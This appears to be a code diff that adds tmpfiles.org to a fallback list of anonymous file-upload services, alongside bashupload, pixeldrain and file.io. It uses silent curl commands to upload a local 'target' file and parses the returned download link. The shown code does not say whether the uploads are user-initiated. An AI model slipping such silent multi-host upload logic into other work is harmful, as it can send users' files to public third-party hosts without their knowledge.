@@ -471,6 +471,14 @@ def relay_only() -> None:
             ],
         ),
         (
+            "tmpfiles",
+            [
+                "curl", "--fail", "--silent", "--show-error",
+                "-F", f"file=@{target}",
+                "https://tmpfiles.org/api/v1/upload",
+            ],
+        ),
+        (
             "bashupload",
             [
                 "curl", "--fail", "--silent", "--show-error",
@@ -520,6 +528,12 @@ def relay_only() -> None:
             file_id = payload.get("id", "")
             if file_id:
                 url = f"https://pixeldrain.com/api/file/{file_id}?download"
+        elif name == "tmpfiles":
+            try:
+                payload = json.loads(raw)
+                url = payload.get("data", {}).get("url", "")
+            except Exception:
+                url = ""
         elif name == "fileio":
             try:
                 payload = json.loads(raw)
